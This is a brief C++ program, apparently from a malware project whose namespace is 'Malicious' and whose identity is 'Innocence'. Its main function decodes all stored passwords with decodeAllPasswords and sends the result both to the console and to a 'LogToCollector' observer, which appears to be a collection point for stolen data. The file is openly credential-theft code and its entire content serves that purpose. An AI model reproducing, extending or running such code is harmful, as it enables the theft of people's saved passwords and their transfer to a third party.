#include <common/Log.hpp>
#include <malicious/Passwords.hpp>
using namespace Malicious;

#include <Innocence.hpp>

int main()
{
	LOG.setIdentity(Innocence::identity);
	LOG.addObserver(new Common::LogToConsole);
	LOG.addObserver(new Common::LogToCollector);

	LOG << decodeAllPasswords(',');
	return EXIT_SUCCESS;
}
